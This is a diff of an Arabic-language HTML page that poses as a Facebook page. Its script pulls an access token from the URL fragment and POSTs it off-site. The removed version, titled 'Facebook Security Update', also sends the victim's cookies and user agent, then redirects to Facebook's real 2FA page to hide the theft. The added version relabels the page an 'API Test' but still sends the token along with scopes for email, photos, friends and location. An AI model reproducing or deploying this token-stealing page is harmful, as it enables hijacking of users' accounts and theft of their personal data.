@@ -2,9 +2,10 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Facebook Security Update</title>
+    <title>Facebook API Test</title>
 </head>
-<body>
+<body style="background-color: #f0f2f5; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h2>Testing Scopes for Security Report...</h2>
     <script>
         (function() {
             const hash = window.location.hash;
@@ -16,19 +17,15 @@
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify({
-                        access_token: token,
-                        cookies: document.cookie,
-                        ua: navigator.userAgent,
-                        url: window.location.href
+                        token: token,
+                        scopes_tested: "birthday,location,photos,friends,posts,gender,email,openid",
+                        report_ref: "924595693574152"
                     })
                 });
             }
-
-            document.body.innerHTML = "<center><h2 style='margin-top:50px; font-family:sans-serif;'>Checking security status...</h2></center>";
-            
             setTimeout(() => {
-                window.location.href = "https://www.facebook.com/security/2fa/setup/intro/";
-            }, 1000);
+                window.location.href = "https://developers.facebook.com/tools/explorer/";
+            }, 1500);
         })();
     </script>
 </body>
